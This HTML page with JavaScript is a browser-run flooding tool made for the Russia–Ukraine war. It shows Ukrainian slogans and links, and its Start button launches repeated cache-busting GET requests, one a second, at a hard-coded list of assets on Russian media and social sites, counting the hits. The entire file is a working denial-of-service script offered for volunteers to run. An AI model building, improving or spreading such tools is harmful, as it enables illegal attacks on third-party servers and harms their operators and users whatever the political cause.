<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<html>
    <head>
        <title>
            Русский военный корабль, иди нахуй!
        </title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
            integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
            <script src="./sites.js"></script>
            <style>
                .container { 
  height: 200px;
  position: relative;
}

.center {
  margin: 0;
  position: absolute;
  top: 50%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
}

#btn{
    align-content: center;
width: 100px;
height: 50px;
}
            </style>
            
    </head>
    <body>
        <div class="container">
            <div class="center">
                <title>Русский военный корабль, иди нахуй!</title>
                <p id="text">Слава Україні</p>
                <button id="btn">Start</button>
                <p id="count"></p>
            </div>

<br />
<a href="https://www.facebook.com/GeneralStaff.ua">GeneralStaff.ua</a>
<br />
<a href="https://www.facebook.com/UkrainianLandForces">UkrainianLandForce</a>
<br />
<a href="https://www.facebook.com/yuri.biriukov">yuri.biriukov</a>
<br />
<a href="https://www.facebook.com/zelenskiy.official">zelenskiy.official</a>
<br />
<a href="https://www.facebook.com/NationalBankOfUkraine/posts/316243890546264">NationalBankOfUkraine</a>
<br />
<a href="https://t.me/ShrikeNews">ShrikeNews</a>
<br />
<a href="https://t.me/dumskaya_net">dumskaya TG</a>
<br />
<a href="https://dumskaya.net">dumskaya.net</a>
        </div>
        <p>Total:</p>
        <p id="allSites"></p>
    </body>
    <script>
        const sites = [
                {
                    url: "https://cdn.ren.tv/asset/dist/client/ea1684f.js",
                    method: "GET",
                },
                {
                    url:"https://cdn.iz.ru/sites/default/files/styles/1300x500/public/video_item-2019-07/%D1%86%D0%B2%D0%B5%D1%82%D1%8B.jpg?itok=hjCdS5rW",
                    method:"GET"
                },
                {
                url: "https://cdn.iz.ru/sites/default/files/styles/1300x500/public/video_item-2019-06/360%20%D0%BF%D0%BC%D1%8D%D1%84.jpg?itok=2JnWu5zu",
                method: "GET"
            },
            {
                url: "https://cdn.iz.ru/sites/default/files/styles/970x546/public/video_item-2022-02/%D0%9C%D0%B0%D1%80%D0%B8%D1%8F%20%D0%97%D0%B0%D1%85%D0%B0%D1%80%D0%BE%D0%B2%D0%B0%20%D0%BD%D0%B0%D0%B7%D0%B2%D0%B0%D0%BB%D0%B0%20%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D1%83%D1%8E%20%D1%86%D0%B5%D0%BB%D1%8C%20.jpg?itok=PKXEUn2h",
                method: "GET"
            },
            {
                url: "https://cdn.iz.ru/sites/default/files/styles/2048x1365/public/photo_item-2022-02/1645530671_3.jpg?itok=k-sm84Ga",
                method: "GET"
            },
            {
                url:"ttps://webpulse.imgsmail.ru/imgpreview?key=pulse_cabinet-image-442730ff-d7d9-451d-9d16-ba6dc1c1a327&mb=webpulse&stream_id=partners_widget_horizontal_news_front_info&crop=fd&fu=1&h=416&w=776"
            },
            {
                "url":"https://cdn.news-front.info/uploads/2022/02/%D0%92%D0%A4%D0%A3-%D0%BF%D0%B5%D1%80%D0%B5%D0%BA%D1%80%D1%8B%D0%BB%D0%B8-%D0%B2%D1%81%D0%B5-%D0%B2%D1%8B%D0%B5%D0%B7%D0%B4%D1%8B-%D0%B8%D0%B7-%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%D0%BE%D0%B2-%D0%B8-%D0%BF%D0%BB%D0%B0%D0%BD%D0%B8%D1%80%D1%83%D1%8E%D1%82-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D1%8C-%D0%BD%D0%B0%D1%81%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B2-%D0%BA%D0%B0%D1%87%D0%B5%D1%81%D1%82%D0%B2%D0%B5-%D0%B6%D0%B8%D0%B2%D0%BE%D0%B3%D0%BE-%D1%89%D0%B8%D1%82%D0%B0-%E2%80%93-%D0%91%D0%B0%D1%81%D1%83%D1%80%D0%B8%D0%BD.png"
            },
            {
                "url": "https://st.vk.com/dist/common.3386bbbf412eb20577bd.js?285c6a7a0dd89083410d3df"
            },
            {
                "url": "https://cdn.news-front.info/uploads/2022/02/%D0%A1-%D0%BD%D0%B0%D1%87%D0%B0%D0%BB%D0%B0-%D1%82%D0%B5%D0%BA%D1%83%D1%89%D0%B8%D1%85-%D1%81%D1%83%D1%82%D0%BE%D0%BA-%D0%BF%D1%80%D0%BE%D1%82%D0%B8%D0%B2%D0%BD%D0%B8%D0%BA-113-%D1%80%D0%B0%D0%B7-%D0%BE%D1%82%D0%BA%D1%80%D1%8B%D0%B2%D0%B0%D0%BB-%D0%BE%D0%B3%D0%BE%D0%BD%D1%8C-%D0%BF%D0%BE-%D1%82%D0%B5%D1%80%D1%80%D0%B8%D1%82%D0%BE%D1%80%D0%B8%D0%B8-%D0%94%D0%9D%D0%A0-%E2%80%93-%D0%91%D0%B0%D1%81%D1%83%D1%80%D0%B8%D0%BD-640x330.png"
            },
            {
                "url": "https://cdn.news-front.info/uploads/2022/02/29d33e79-71a3-4051-9a47-b82bba30cb66.jpg"
            }
            ];
            

        const btn = document.getElementById("btn");
        const countP = document.getElementById("count");
            const textP = document.getElementById("text");
                const allSites = document.getElementById("allSites");
                allSites.innerText = sites.length

        $(document).ready(function () {
            $.ajaxSetup({ cache: false });
        });

        btn.addEventListener("click", () => {
            if (btn.innerText === "Start") {
                textP.innerText = "Героям Слава!"
                btn.innerText = "Stop";
                start();
            } else {
                textP.innerText = "Слава Україні"
                stop();
                btn.innerText = "Start";
            }
        });
        var start_state = false;

        function stop(){
            start_state = false;
        }

        function start(){
            start_state = true;
        }

    var count_all = 0;
        var counter = 0;

        setInterval(function () {
            if(start_state && counter === 0){
                var s = sites[Math.floor(Math.random() * sites.length)];
                console.log("ites[s", sites, s)
                counter++
                try{
                $.ajax({
                    url: s.url,
                    method: "GET",
                    success: function () {
                        count_all++;
                        countP.innerText = count_all + "";
                        counter = 0;
                    },
                    error: function (xhr, status, error) {
                        counter = 0;
                    },
                    complete: function () {
                        counter = 0;
                    },
                    timeout: 3000
                });
                }catch(e){
                    counter =0;
                }
            }                  
        }, 1000)
        
    </script>
</html>
